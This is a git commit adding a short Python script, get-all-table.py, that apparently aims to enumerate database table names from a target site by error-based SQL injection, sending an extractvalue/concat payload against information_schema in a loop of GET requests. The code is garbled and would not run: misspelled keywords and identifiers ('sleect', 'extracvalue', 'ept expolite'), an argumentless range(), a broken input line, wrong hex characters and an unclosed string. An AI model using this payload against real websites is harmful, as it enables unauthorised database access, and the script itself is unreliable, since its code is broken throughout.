c9c218da6be0c5523b8b6ecc015f17fd56b941ab
Alipnoticare <66096247+Alipnoticare@users.noreply.github.com>
2020-05-29 04:22:51 +0430

    Create get-all-table.py

---
+++ get-all-table.py
@@ -0,0 +1,12 @@
+import requests as req
+try:
+	  for i in range():
+	  	 input() url=
+	  	  cmd = "? ord= and extracvalue(1,concat(0×3a, (sleect TABLE_NAME  from"
+	  	  cmd += "information_schema.table where TABLE_SCHEMA=database() limit "+str (i) +" ,1)(,0×3a))"
+	  	  url2 = url + cmd 
+	  	  r = req.get(url2)
+	  	  data = str(r.content).split(':')
+	  	  print("tables + str(i) + " => " + data[2])
+	  	ept expolite as e:
+	  		print(e)
